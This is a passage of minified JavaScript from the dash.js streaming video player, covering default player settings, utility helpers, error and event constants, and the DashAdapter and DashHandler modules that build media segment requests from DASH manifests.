EAM_SWITCHING_SEGMENT_TYPE,1e3),m(x,r.HTTPRequest.INDEX_SEGMENT_TYPE,1e3),m(x,r.HTTPRequest.OTHER_TYPE,1e3),m(x,"lowLatencyReductionFactor",10),x),retryAttempts:(m(z={},r.HTTPRequest.MPD_TYPE,3),m(z,r.HTTPRequest.XLINK_EXPANSION_TYPE,1),m(z,r.HTTPRequest.MEDIA_SEGMENT_TYPE,3),m(z,r.HTTPRequest.INIT_SEGMENT_TYPE,3),m(z,r.HTTPRequest.BITSTREAM_SWITCHING_SEGMENT_TYPE,3),m(z,r.HTTPRequest.INDEX_SEGMENT_TYPE,3),m(z,r.HTTPRequest.OTHER_TYPE,3),m(z,"lowLatencyMultiplyFactor",5),z),abr:{movingAverageMethod:t.default.MOVING_AVERAGE_SLIDING_WINDOW,ABRStrategy:t.default.ABR_STRATEGY_DYNAMIC,bandwidthSafetyFactor:.9,useDefaultABRRules:!0,useBufferOccupancyABR:!1,useDeadTimeLatency:!0,limitBitrateByPortal:!1,usePixelRatioInLimitBitrateByPortal:!1,maxBitrate:{audio:-1,video:-1},minBitrate:{audio:-1,video:-1},maxRepresentationRatio:{audio:1,video:1},initialBitrate:{audio:-1,video:-1},initialRepresentationRatio:{audio:-1,video:-1},autoSwitchBitrate:{audio:!0,video:!0}},cmcd:{enabled:!1,sid:null,cid:null,did:null}}},E=f.default.clone(J);return{get:function(){return E},update:function(D){"object"==typeof D&&function w(L,G,N){for(var h in L)L.hasOwnProperty(h)&&G.hasOwnProperty(h)&&("object"==typeof L[h]&&null!==L[h]?w(L[h],G[h],N.slice()+h+"."):G[h]=f.default.clone(L[h]))}(D,E,"")},reset:function(){E=f.default.clone(J)}}}Object.defineProperty(M,"__esModule",{value:!0});var l=v(u(47)),f=v(u(49)),g=v(u(45)),t=v(u(108)),r=u(241);p.__dashjs_factory_name="Settings",u=l.default.getSingletonFactory(p),M.default=u,da.exports=M.default},{108:108,241:241,45:45,47:47,49:49}],49:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function")}var p,f;Object.defineProperty(M,"__esModule",{value:!0}),p=m,f=[{key:"mixin",value:function(p,l,f){var g=void 0,t={};if(p)for(var r in l)l.hasOwnProperty(r)&&(g=l[r],r in p&&(p[r]===g||r in t&&t[r]===g)||("object"==typeof p[r]&&null!==p[r]?p[r]=m.mixin(p[r],g,f):p[r]=f(g)));return p}},{key:"clone",value:function(p){if(!p||"object"!=typeof p)return p;if(p instanceof Array)for(var l=[],f=0,g=p.length;f<g;++f)f in p&&l.push(m.clone(p[f]));else l={};return m.mixin(l,p,m.clone)}},{key:"addAditionalQueryParameterToUrl",value:function(p,l){try{var f=function(){if(!l||0===l.length)return{v:p};var g=new URL(p);return l.forEach((function(t){t.key&&t.value&&g.searchParams.set(t.key,t.value)})),{v:g.href}}();if("object"==typeof f)return f.v}catch(g){return p}}},{key:"generateUuid",value:function(){var p=(new Date).getTime();return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(l){var f=(p+16*Math.random())%16|0;return p=Math.floor(p/16),("x"==l?f:3&f|8).toString(16)}))}},{key:"generateHashCode",value:function(p){var l=0;if(0===p.length)return l;for(var f=0;f<p.length;f++)l=(l<<5)-l+p.charCodeAt(f),l|=0;return l}}],f&&v(p,f),u=m,M.default=u,da.exports=M.default},{}],50:[function(u,da,M){Object.defineProperty(M,"__esModule",{value:!0}),M.getVersionString=function(){return v};var v="3.1.2"},{}],51:[function(u,da,M){function v(){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");a:{for(var m=Object.getPrototypeOf(v.prototype),p="constructor",l=this,f=!0;f;){if(null===m&&(m=Function.prototype),void 0!==(f=Object.getOwnPropertyDescriptor(m,p))){if("value"in f){l=f.value;break a}if(void 0===(p=f.get))break;l=p.call(l);break a}if(null===(m=Object.getPrototypeOf(m)))break;f=!0}l=void 0}l.call(this),this.MANIFEST_LOADER_PARSING_FAILURE_ERROR_CODE=10,this.MANIFEST_LOADER_LOADING_FAILURE_ERROR_CODE=11,this.XLINK_LOADER_LOADING_FAILURE_ERROR_CODE=12,this.SEGMENTS_UPDATE_FAILED_ERROR_CODE=13,this.SEGMENTS_UNAVAILABLE_ERROR_CODE=14,this.SEGMENT_BASE_LOADER_ERROR_CODE=15,this.TIME_SYNC_FAILED_ERROR_CODE=16,this.FRAGMENT_LOADER_LOADING_FAILURE_ERROR_CODE=17,this.FRAGMENT_LOADER_NULL_REQUEST_ERROR_CODE=18,this.URL_RESOLUTION_FAILED_GENERIC_ERROR_CODE=19,this.APPEND_ERROR_CODE=20,this.REMOVE_ERROR_CODE=21,this.DATA_UPDATE_FAILED_ERROR_CODE=22,this.CAPABILITY_MEDIASOURCE_ERROR_CODE=23,this.CAPABILITY_MEDIAKEYS_ERROR_CODE=24,this.DOWNLOAD_ERROR_ID_MANIFEST_CODE=25,this.DOWNLOAD_ERROR_ID_SIDX_CODE=26,this.DOWNLOAD_ERROR_ID_CONTENT_CODE=27,this.DOWNLOAD_ERROR_ID_INITIALIZATION_CODE=28,this.DOWNLOAD_ERROR_ID_XLINK_CODE=29,this.MANIFEST_ERROR_ID_CODEC_CODE=30,this.MANIFEST_ERROR_ID_PARSE_CODE=31,this.MANIFEST_ERROR_ID_NOSTREAMS_CODE=32,this.TIMED_TEXT_ERROR_ID_PARSE_CODE=33,this.MANIFEST_ERROR_ID_MULTIPLEXED_CODE=34,this.MEDIASOURCE_TYPE_UNSUPPORTED_CODE=35,this.MANIFEST_LOADER_PARSING_FAILURE_ERROR_MESSAGE="parsing failed for ",this.MANIFEST_LOADER_LOADING_FAILURE_ERROR_MESSAGE="Failed loading manifest: ",this.XLINK_LOADER_LOADING_FAILURE_ERROR_MESSAGE="Failed loading Xlink element: ",this.SEGMENTS_UPDATE_FAILED_ERROR_MESSAGE="Segments update failed",this.SEGMENTS_UNAVAILABLE_ERROR_MESSAGE="no segments are available yet",this.SEGMENT_BASE_LOADER_ERROR_MESSAGE="error loading segments",this.TIME_SYNC_FAILED_ERROR_MESSAGE="Failed to synchronize time",this.FRAGMENT_LOADER_NULL_REQUEST_ERROR_MESSAGE="request is null",this.URL_RESOLUTION_FAILED_GENERIC_ERROR_MESSAGE="Failed to resolve a valid URL",this.APPEND_ERROR_MESSAGE="chunk is not defined",this.REMOVE_ERROR_MESSAGE="buffer is not defined",this.DATA_UPDATE_FAILED_ERROR_MESSAGE="Data update failed",this.CAPABILITY_MEDIASOURCE_ERROR_MESSAGE="mediasource is not supported",this.CAPABILITY_MEDIAKEYS_ERROR_MESSAGE="mediakeys is not supported",this.TIMED_TEXT_ERROR_MESSAGE_PARSE="parsing error :",this.MEDIASOURCE_TYPE_UNSUPPORTED_MESSAGE="Error creating source buffer of type : "}Object.defineProperty(M,"__esModule",{value:!0}),u=new(function(m,p){if("function"!=typeof p&&null!==p)throw new TypeError("Super expression must either be null or a function, not "+typeof p);m.prototype=Object.create(p&&p.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),p&&(Object.setPrototypeOf?Object.setPrototypeOf(m,p):m.__proto__=p)}(v,((u=u(52))&&u.__esModule?u:{default:u}).default),v),M.default=u,da.exports=M.default},{52:52}],52:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function")}var p,l;Object.defineProperty(M,"__esModule",{value:!0}),p=m,l=[{key:"extend",value:function(p,l){if(p){var f=!!l&&l.override;for(var g in l=!!l&&l.publicOnly,p)!p.hasOwnProperty(g)||this[g]&&!f||l&&-1===p[g].indexOf("public_")||(this[g]=p[g])}}}],l&&v(p.prototype,l),u=m,M.default=u,da.exports=M.default},{}],53:[function(u,da,M){function v(){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");a:{for(var m=Object.getPrototypeOf(v.prototype),p="constructor",l=this,f=!0;f;){if(null===m&&(m=Function.prototype),void 0!==(f=Object.getOwnPropertyDescriptor(m,p))){if("value"in f){l=f.value;break a}if(void 0===(p=f.get))break;l=p.call(l);break a}if(null===(m=Object.getPrototypeOf(m)))break;f=!0}l=void 0}l.call(this),this.BUFFERING_COMPLETED="bufferingCompleted",this.BUFFER_CLEARED="bufferCleared",this.BUFFER_LEVEL_UPDATED="bufferLevelUpdated",this.BYTES_APPENDED="bytesAppended",this.BYTES_APPENDED_END_FRAGMENT="bytesAppendedEndFragment",this.CHECK_FOR_EXISTENCE_COMPLETED="checkForExistenceCompleted",this.CURRENT_TRACK_CHANGED="currentTrackChanged",this.DATA_UPDATE_COMPLETED="dataUpdateCompleted",this.DATA_UPDATE_STARTED="dataUpdateStarted",this.INBAND_EVENTS="inbandEvents",this.INITIALIZATION_LOADED="initializationLoaded",this.INIT_FRAGMENT_LOADED="initFragmentLoaded",this.INIT_FRAGMENT_NEEDED="initFragmentNeeded",this.INTERNAL_MANIFEST_LOADED="internalManifestLoaded",this.ORIGINAL_MANIFEST_LOADED="originalManifestLoaded",this.LIVE_EDGE_SEARCH_COMPLETED="liveEdgeSearchCompleted",this.LOADING_COMPLETED="loadingCompleted",this.LOADING_PROGRESS="loadingProgress",this.LOADING_DATA_PROGRESS="loadingDataProgress",this.LOADING_ABANDONED="loadingAborted",this.MANIFEST_UPDATED="manifestUpdated",this.MEDIA_FRAGMENT_LOADED="mediaFragmentLoaded",this.MEDIA_FRAGMENT_NEEDED="mediaFragmentNeeded",this.QUOTA_EXCEEDED="quotaExceeded",this.REPRESENTATION_UPDATE_STARTED="representationUpdateStarted",this.REPRESENTATION_UPDATE_COMPLETED="representationUpdateCompleted",this.SEGMENTS_LOADED="segmentsLoaded",this.SERVICE_LOCATION_BLACKLIST_ADD="serviceLocationBlacklistAdd",this.SERVICE_LOCATION_BLACKLIST_CHANGED="serviceLocationBlacklistChanged",this.SOURCEBUFFER_REMOVE_COMPLETED="sourceBufferRemoveCompleted",this.STREAMS_COMPOSED="streamsComposed",this.STREAM_BUFFERING_COMPLETED="streamBufferingCompleted",this.STREAM_COMPLETED="streamCompleted",this.TEXT_TRACKS_QUEUE_INITIALIZED="textTracksQueueInitialized",this.TIME_SYNCHRONIZATION_COMPLETED="timeSynchronizationComplete",this.URL_RESOLUTION_FAILED="urlResolutionFailed",this.VIDEO_CHUNK_RECEIVED="videoChunkReceived",this.WALLCLOCK_TIME_UPDATED="wallclockTimeUpdated",this.XLINK_ELEMENT_LOADED="xlinkElementLoaded",this.XLINK_READY="xlinkReady",this.SEGMENTBASE_INIT_REQUEST_NEEDED="segmentBaseInitRequestNeeded",this.SEGMENTBASE_SEGMENTSLIST_REQUEST_NEEDED="segmentBaseSegmentsListRequestNeeded",this.SEEK_TARGET="seekTarget",this.DYNAMIC_STREAM_COMPLETED="dynamicStreamCompleted"}Object.defineProperty(M,"__esModule",{value:!0}),function(m,p){if("function"!=typeof p&&null!==p)throw new TypeError("Super expression must either be null or a function, not "+typeof p);m.prototype=Object.create(p&&p.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),p&&(Object.setPrototypeOf?Object.setPrototypeOf(m,p):m.__proto__=p)}(v,((u=u(55))&&u.__esModule?u:{default:u}).default),u=v,M.default=u,da.exports=M.default},{55:55}],54:[function(u,da,M){function v(){if(!(this instanceof v))throw new TypeError("Cannot call a class as a function");a:{for(var m=Object.getPrototypeOf(v.prototype),p="constructor",l=this,f=!0;f;){if(null===m&&(m=Function.prototype),void 0!==(f=Object.getOwnPropertyDescriptor(m,p))){if("value"in f){l=f.value;break a}if(void 0===(p=f.get))break;l=p.call(l);break a}if(null===(m=Object.getPrototypeOf(m)))break;f=!0}l=void 0}l.apply(this,arguments)}Object.defineProperty(M,"__esModule",{value:!0}),u=new(function(m,p){if("function"!=typeof p&&null!==p)throw new TypeError("Super expression must either be null or a function, not "+typeof p);m.prototype=Object.create(p&&p.prototype,{constructor:{value:m,enumerable:!1,writable:!0,configurable:!0}}),p&&(Object.setPrototypeOf?Object.setPrototypeOf(m,p):m.__proto__=p)}(v,((u=u(53))&&u.__esModule?u:{default:u}).default),v),M.default=u,da.exports=M.default},{53:53}],55:[function(u,da,M){function v(p,l){for(var f=0;f<l.length;f++){var g=l[f];g.enumerable=g.enumerable||!1,g.configurable=!0,"value"in g&&(g.writable=!0),Object.defineProperty(p,g.key,g)}}function m(){if(!(this instanceof m))throw new TypeError("Cannot call a class as a function")}var p,l;Object.defineProperty(M,"__esModule",{value:!0}),p=m,l=[{key:"extend",value:function(p,l){if(p){var f=!!l&&l.override;for(var g in l=!!l&&l.publicOnly,p)!p.hasOwnProperty(g)||this[g]&&!f||l&&-1===p[g].indexOf("public_")||(this[g]=p[g])}}}],l&&v(p.prototype,l),u=m,M.default=u,da.exports=M.default},{}],56:[function(u,da,M){function v(J){return J&&J.__esModule?J:{default:J}}function m(){function J(Z,na,T){var pa;if(!(Z=W.getAdaptationsForType(aa[0].mpd.manifest,Z,na))||0===Z.length)return null;if(1<Z.length&&T){var ia=E(T,na);if(H[T.id]&&H[T.id][na])for(var S=0,V=Z.length;S<V;S++)if(H[T.id][na].isMediaInfoEqual(ia[S]))return Z[S];for(S=0,V=Z.length;S<V;S++)if(pa=Z[S],W.getRolesForAdaptation(pa).filter((function(oa){return oa.value===p.default.MAIN}))[0])return Z[S]}return Z[0]}function E(Z,na,T){var pa,oa,ha,ia=aa,S=[],V=void 0,ba=void 0,ka=void 0;if(T)O(),ia=D(T);else{if(!(0<aa.length))return S;T=aa[0].mpd.manifest}if((pa=w(Z,ia))&&(ka=pa.id),!(ia=W.getAdaptationsForType(T,Z?Z.index:null,na!==B.EMBEDDED_TEXT?na:B.VIDEO))||0===ia.length)return S;ma[ka]=ma[ka]||W.getAdaptationsForPeriod(pa);var la=0;for(pa=ia.length;la<pa;la++)if(V=ia[la],ba=W.getIndexForAdaptation(V,T,Z.index),oa=h(ma[ka][ba]),na===B.EMBEDDED_TEXT){var C=oa.accessibility.length;for(ha=0;ha<C;ha++)if(oa){var fa=oa.accessibility[ha];if(0===fa.indexOf("cea-608:"))if("CC"===(fa=fa.substring(8).split(";"))[0].substring(0,2))for(ha=0;ha<fa.length;ha++)F(oa=oa||h.call(this,ma[ka][ba]),fa[ha].substring(0,3),fa[ha].substring(4)),S.push(oa),oa=null;else for(ha=0;ha<fa.length;ha++)F(oa=oa||h.call(this,ma[ka][ba]),"CC"+(ha+1),fa[ha]),S.push(oa),oa=null;else 0===fa.indexOf("cea-608")&&(F(oa,B.CC1,"eng"),S.push(oa),oa=null)}}else na===B.IMAGE?(oa.type=B.IMAGE,S.push(oa)):oa&&S.push(oa);return S}function D(Z){return Z=I(Z),W.getRegularPeriods(Z)}function I(Z){return Z=G(Z),W.getMpd(Z)}function L(){aa=[],ma={},H={}}function G(Z){return Z||(0<aa.length?aa[0].mpd.manifest:null)}function N(Z){return Z&&Z.streamInfo&&void 0!==Z.streamInfo.id&&ma[Z.streamInfo.id]?ma[Z.streamInfo.id][Z.index]:null}function w(Z,na){for(var T=na.length,pa=0;pa<T;pa++){var ia=na[pa];if(Z&&Z.id===ia.id)return ia}return null}function h(Z){if(!Z)return null;var na,T=new f.default,pa=Z.period.mpd.manifest.Period_asArray[Z.period.index].AdaptationSet_asArray[Z.index];return T.id=Z.id,T.index=Z.index,T.type=Z.type,T.streamInfo=P(Z.period),T.representationCount=W.getRepresentationCount(pa),T.labels=W.getLabelsForAdaptation(pa),T.lang=W.getLanguageForAdaptation(pa),na=W.getViewpointForAdaptation(pa),T.viewpoint=na?na.value:void 0,T.accessibility=W.getAccessibilityForAdaptation(pa).map((function(ia){var S=ia.value,V=S;return ia.schemeIdUri&&0<=ia.schemeIdUri.search("cea-608")&&void 0!==A&&(V=S?"cea-608:"+S:"cea-608",T.embeddedCaptions=!0),V})),T.audioChannelConfiguration=W.getAudioChannelConfigurationForAdaptation(pa).map((function(ia){return ia.value})),0===T.audioChannelConfiguration.length&&Array.isArray(pa.Representation_asArray)&&0<pa.Representation_asArray.length&&(T.audioChannelConfiguration=W.getAudioChannelConfigurationForRepresentation(pa.Representation_asArray[0]).map((function(ia){return ia.value}))),T.roles=W.getRolesForAdaptation(pa).map((function(ia){return ia.value})),T.codec=W.getCodec(pa),T.mimeType=W.getMimeType(pa),T.contentProtection=W.getContentProtectionData(pa),T.bitrateList=W.getBitrateListForAdaptation(pa),T.contentProtection&&T.contentProtection.forEach((function(ia){ia.KID=W.getKID(ia)})),T.isText=W.getIsTextTrack(T.mimeType),T.supplementalProperties=W.getSupplementalPropperties(pa),T}function F(Z,na,T){Z.id=na,Z.index=100+parseInt(na.substring(2,3)),Z.type=B.EMBEDDED_TEXT,Z.codec="cea-608-in-SEI",Z.isText=!0,Z.isEmbedded=!0,Z.lang=T,Z.roles=["caption"]}function P(Z){var na,T,pa=new g.default;return pa.id=Z.id,pa.index=Z.index,pa.start=Z.start,pa.duration=Z.duration,pa.manifestInfo=(na=Z.mpd,(T=new t.default).DVRWindowSize=na.timeShiftBufferDepth,T.loadedTime=na.manifest.loadedTime,T.availableFrom=na.availabilityStartTime,T.minBufferTime=na.manifest.minBufferTime,T.maxFragmentDuration=na.maxSegmentDuration,T.duration=W.getDuration(na.manifest),T.isDynamic=W.getIsDynamic(na.manifest),T.serviceDescriptions=W.getServiceDescriptions(na.manifest),T.protocol=na.manifest.protocol,T),pa.isLast=1===Z.mpd.manifest.Period_asArray.length||1>Math.abs(pa.start+pa.duration-pa.manifestInfo.duration),pa}function O(){if(!B)throw Error("setConfig function has to be called previously")}function R(Z){return 0<aa.length?aa[0].mpd.manifest.Period_asArray[Z]:null}function Q(Z,na,T){var pa,ia,S;if(Z)for(Z=Z.AdaptationSet_asArray,ia=0;ia<Z.length;ia+=1){var V=Z[ia].Representation_asArray;for(S=0;S<V.length;S+=1)if(na===(pa=V[S]).id)return T?S:pa}return null}var ja,W=void 0,aa=void 0,ma=void 0,H=void 0,B=void 0,A=void 0,Y=this.context;return ja={getBandwidthForRepresentation:function(Z,na){var T;return(T=Q(R(na),Z))?T.bandwidth:null},getIndexForRepresentation:function(Z,na){var T;return null!==(T=Q(na=R(na),Z,!0))?T:-1},getMaxIndexForBufferType:function(Z,na){a:{var pa,ia,T=R(na);if(na=void 0,T&&Z)for(T=T.AdaptationSet_asArray,ia=0;ia<T.length;ia+=1)if(pa=(na=T[ia]).Representation_asArray,W.getIsTypeOf(na,Z)){Z=pa.length;break a}Z=-1}return Z},convertDataToRepresentationInfo:function(Z){if(Z){var na=new l.default,T=W.getRepresentationFor(Z.index,Z.adaptation.period.mpd.manifest.Period_asArray[Z.adaptation.period.index].AdaptationSet_asArray[Z.adaptation.index]);return na.id=Z.id,na.quality=Z.index,na.bandwidth=W.getBandwidth(T),na.DVRWindow=Z.segmentAvailabilityRange,na.fragmentDuration=Z.segmentDuration||(Z.segments&&0<Z.segments.length?Z.segments[0].duration:NaN),na.MSETimeOffset=Z.MSETimeOffset,na.useCalculatedLiveEdgeTime=Z.useCalculatedLiveEdgeTime,na.mediaInfo=h(Z.adaptation),na}return null},getDataForMedia:N,getStreamsInfo:function(Z,na){var T=[],pa=aa;if(Z&&(O(),pa=D(Z)),0<pa.length)for((!na||na>pa.length)&&(na=pa.length),Z=0;Z<na;Z++)T.push(P(pa[Z]));return T},getMediaInfoForType:function(Z,na){if(0===aa.length||!Z)return null;var T=w(Z,aa);if(!T)return null;var pa=T.id;return ma[pa]=ma[pa]||W.getAdaptationsForPeriod(T),(na=J(Z.index,na,Z))?(Z=W.getIndexForAdaptation(na,aa[0].mpd.manifest,Z.index),h(ma[pa][Z])):null},getAllMediaInfoForType:E,getAdaptationForType:J,getRealAdaptation:function(Z,na){var T=void 0;Z=w(Z,aa);var pa=na?na.id:null;return 0<aa.length&&Z&&(T=pa?W.getAdaptationForId(pa,aa[0].mpd.manifest,Z.index):W.getAdaptationForIndex(na?na.index:null,aa[0].mpd.manifest,Z.index)),T},getVoRepresentations:function(Z){return Z=N(Z),W.getRepresentationsForAdaptation(Z)},getEventsFor:function(Z,na){var T,pa=[];return 0<aa.length&&(T=aa[0].mpd.manifest,Z instanceof g.default?pa=W.getEventsForPeriod(w(Z,aa)):Z instanceof f.default?pa=W.getEventStreamForAdaptationSet(T,N(Z)):Z instanceof l.default&&(pa=W.getEventStreamForRepresentation(T,na))),pa},getEvent:function(Z,na,T){if(!Z||!na)return null;var pa=new r.default,ia=Z.scheme_id_uri,S=Z.value,V=Z.timescale,oa=Z.presentation_time_delta,ba=Z.event_duration,ha=Z.id;return Z=Z.message_data,na[ia+"/"+S]?(pa.eventStream=na[ia+"/"+S],pa.eventStream.value=S,pa.eventStream.timescale=V,pa.duration=ba,pa.id=ha,pa.calculatedPresentationTime=T*V+oa,pa.messageData=Z,pa.presentationTimeDelta=oa,pa):null},setConfig:function(Z){Z&&(Z.constants&&(B=Z.constants),Z.cea608parser&&(A=Z.cea608parser),Z.errHandler&&W.setConfig({errHandler:Z.errHandler}),Z.BASE64&&W.setConfig({BASE64:Z.BASE64}))},updatePeriods:function(Z){if(!Z)return null;O(),aa=D(Z),ma={}},getUseCalculatedLiveEdgeTimeForMediaInfo:function(Z){return Z=N(Z),W.getUseCalculatedLiveEdgeTimeForAdaptation(Z)},getIsTextTrack:function(Z){return W.getIsTextTrack(Z)},getUTCTimingSources:function(){var Z=G();return W.getUTCTimingSources(Z)},getSuggestedPresentationDelay:function(){return W.getSuggestedPresentationDelay(0<aa.length?aa[0].mpd:null)},getAvailabilityStartTime:function(Z){return Z=I(Z),W.getAvailabilityStartTime(Z)},getIsDynamic:function(Z){return Z=G(Z),W.getIsDynamic(Z)},getDuration:function(Z){return Z=G(Z),W.getDuration(Z)},getRegularPeriods:D,getLocation:function(Z){return W.getLocation(Z)},getManifestUpdatePeriod:function(Z){return W.getManifestUpdatePeriod(Z,1>=arguments.length||void 0===arguments[1]?0:arguments[1])},getIsDVB:function(Z){return W.hasProfile(Z,"urn:dvb:dash:profile:dvb-dash:2014")},getBaseURLsFromElement:function(Z){return W.getBaseURLsFromElement(Z)},getRepresentationSortFunction:function(){return W.getRepresentationSortFunction()},getCodec:function(Z,na,T){return W.getCodec(Z,na,T)},getVoAdaptations:function(){return ma},getVoPeriods:function(){return aa},setCurrentMediaInfo:function(Z,na,T){H[Z]=H[Z]||{},H[Z][na]=H[Z][na]||{},H[Z][na]=T},reset:L},W=(0,z.default)(Y).getInstance(),L(),ja}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(61)),l=v(u(93)),f=v(u(89)),g=v(u(95)),t=v(u(88)),r=v(u(86)),x=v(u(47)),z=v(u(65));m.__dashjs_factory_name="DashAdapter",M.default=x.default.getSingletonFactory(m),da.exports=M.default},{47:47,61:61,65:65,86:86,88:88,89:89,93:93,95:95}],57:[function(u,da,M){function v(r){return r&&r.__esModule?r:{default:r}}function m(r){function x(){B=-1,A=null}function z(S,V,oa){var ba=void 0,ha=void 0;return(oa=aa.resolve(oa.path))&&V!==oa.url&&O.isRelative(V)?(ba=oa.url,ha=oa.serviceLocation,V&&(ba=O.resolve(V,ba))):ba=V,!O.isRelative(ba)&&(S.url=ba,S.serviceLocation=ha,1)}function J(S){var V,oa,ba;S.sender.getType()===R&&(oa=(V=S.representation).hasInitialization(),ba=V.hasSegments(),oa&&ba?w.trigger(h.REPRESENTATION_UPDATE_COMPLETED,{sender:ma,representation:V}):ia.update(V,R,pa,oa,ba))}function E(S,V){if(null==V)return null;var oa=new p.default,ba=V.representation,ha=ba.adaptation.period.mpd.manifest.Period_asArray[ba.adaptation.period.index].AdaptationSet_asArray[ba.adaptation.index].Representation_asArray[ba.index].bandwidth,ka=V.media;return ka=(0,g.replaceTokenForTemplate)(ka,"Number",V.replacementNumber),ka=(0,g.replaceTokenForTemplate)(ka,"Time",V.replacementTime),ka=(0,g.replaceTokenForTemplate)(ka,"Bandwidth",ha),ka=(0,g.replaceIDForTemplate)(ka,ba.id),ka=(0,g.unescapeDollarsInTemplate)(ka),oa.mediaType=R,oa.type=l.HTTPRequest.MEDIA_SEGMENT_TYPE,oa.range=V.mediaRange,oa.startTime=V.presentationStartTime,oa.duration=V.duration,oa.timescale=ba.timescale,oa.availabilityStartTime=V.availabilityStartTime,oa.availabilityEndTime=V.availabilityEndTime,oa.wallStartTime=V.wallStartTime,oa.quality=ba.index,oa.index=V.availabilityIdx,oa.mediaInfo=S,oa.adaptationIndex=ba.adaptation.index,oa.representationId=ba.id,z(oa,ka,ba)?oa:void 0}function D(S){var V,oa,ba=!1;return S&&(na?T?ba=!0:A&&(V=parseFloat((A.presentationStartTime-S.adaptation.period.start).toFixed(5)),oa=0<A.duration?V+1.5*A.duration:V,ba=S.adaptation.period.duration<=oa):B>=S.availableSegmentsNumber&&(ba=!0)),ba}function I(S){(S=S.representation).segments&&w.trigger(h.REPRESENTATION_UPDATE_COMPLETED,{sender:this,representation:S})}function L(S){if(!S.error&&R===S.mediaType){var V,oa=S.segments;S=S.representation;for(var ba=[],ha=0,ka=void 0,la=0,C=oa?oa.length:0;la<C;la++){var fa=oa[la];(ka=(0,g.getTimeBasedSegment)(ja,na,S,fa.startTime,fa.duration,fa.timescale,fa.media,fa.mediaRange,ha))&&(ba.push(ka),ka=null,ha++)}0<ba.length&&(S.segmentAvailabilityRange={start:ba[0].presentationStartTime,end:ba[ba.length-1].presentationStartTime},S.availableSegmentsNumber=ba.length,S.segments=ba,na&&(V=ba[ba.length-1].presentationStartTime-8,ja.setExpectedLiveEdge(V),W.updateManifestUpdateInfo({presentationStartTime:V}))),S.hasInitialization()&&w.trigger(h.REPRESENTATION_UPDATE_COMPLETED,{sender:this,representation:S})}}function G(){H.debug("Dynamic stream complete"),T=!0}r=r||{};var N=this.context,w=r.eventBus,h=r.events,F=r.debug,P=r.dashConstants,O=r.urlUtils,R=r.type,Q=r.streamInfo,ja=r.timelineConverter,W=r.dashMetrics,aa=r.baseURLController,ma=void 0,H=void 0,B=void 0,A=void 0,Y=void 0,Z=void 0,na=void 0,T=void 0,pa=void 0,ia=void 0;return ma={initialize:function(S){na=S,T=!1,ia.initialize(S)},getType:function(){return R},getStreamInfo:function(){return Q},getInitRequest:function(S,V){if(V){var oa=R,ba=new p.default,ha=V.adaptation.period,ka=ha.start;ba.mediaType=oa,ba.type=l.HTTPRequest.INIT_SEGMENT_TYPE,ba.range=V.range,ba.availabilityStartTime=ja.calcAvailabilityStartTimeFromPresentationTime(ka,ha.mpd,na),ba.availabilityEndTime=ja.calcAvailabilityEndTimeFromPresentationTime(ka+ha.duration,ha.mpd,na),ba.quality=V.index,ba.mediaInfo=S,ba.representationId=V.id,S=z(ba,V.initialization,V)?(ba.url=(0,g.replaceTokenForTemplate)(ba.url,"Bandwidth",V.bandwidth),ba):void 0}else S=null;return S},getRequestForSegment:E,getSegmentRequestForTime:function(S,V,oa,ba){var ha=null;if(!V||!V.segmentInfoType)return ha;var ka=B,la=!!ba&&ba.keepIdx;ba=!(!ba||!ba.ignoreIsFinished),Y!==oa&&(Y=oa,H.debug("Getting the request for time : "+oa));var C=ia.getSegmentByTime(V,oa);return C?(B=C.availabilityIdx,A=C,H.debug("Index for time "+oa+" is "+B),ha=E(S,C)):!ba&&D(V)&&((ha=new p.default).action=p.default.ACTION_COMPLETE,ha.index=B-1,ha.mediaType=R,ha.mediaInfo=S,H.debug("Signal complete in getSegmentRequestForTime")),la&&0<=ka&&(B=V.segmentInfoType===P.SEGMENT_TIMELINE&&na?B:ka),ha},getNextSegmentRequest:function(S,V){var oa=null;if(!V||!V.segmentInfoType)return null;Y=null;var ba=B+1;H.debug("Getting the next request at index: "+ba);var ha=ia.getSegmentByIndex(V,ba,A?A.mediaStartTime:-1);return ha||isFinite(V.adaptation.period.duration)||T?(B=ha?(oa=E(S,ha),ha.availabilityIdx):na?ba-1:ba,ha?A=ha:D(V)&&((oa=new p.default).action=p.default.ACTION_COMPLETE,oa.index=B-1,oa.mediaType=R,oa.mediaInfo=S,H.debug("Signal complete")),oa):(H.debug("No segment found at index: "+ba+". Wait for next loop"),null)},setCurrentTime:function(S){Z=S},getCurrentTime:function(){return Z},setCurrentIndex:function(S){B=S},getCurrentIndex:function(){return B},isMediaFinished:D,reset:function(){x(),Z=0,pa=ia=Y=null,w.off(h.INITIALIZATION_LOADED,I,ma),w.off(h.SEGMENTS_LOADED,L,ma),w.off(h.REPRESENTATION_UPDATE_STARTED,J,ma),w.off(h.DYNAMIC_STREAM_COMPLETED,G,ma)},resetIndex:x,setMimeType:function(S){pa=S}},H=F.getLogger(ma),x(),Z=0,pa=ia=Y=null,ia=(0,t.default)(N).create(r),w.on(h.INITIALIZATION_LOADED,I,ma),w.on(h.SEGMENTS_LOADED,L,ma),w.on(h.REPRESENTATION_UPDATE_STARTED,J,ma),w.on(h.DYNAMIC_STREAM_COMPLETED,G,ma),ma}Object.defineProperty(M,"__esModule",{value:!0});var p=v(u(227)),l=u(241),f=v(u(47)),g=u(80),t=v(u(64));m.__dashjs_factory_name="DashHandler",M.default=f.default.getClassFactory(m),da.exports=M.default},{227:227,241:241,47:47,64:64,80:80}],58:[function(u,da,M){function v(z){return z&&z.__esModule?z:{default:z}}function m(z){function J(P){if(!(P=F.getMetricsFor(P,!0)))return null;var R,O=null;if(!(P=P.HttpList)||0>=P.length)return null;for(R=P.length-1;0<=R;){if(P[R].responsecode){O=P[R];break}R--}return O}function 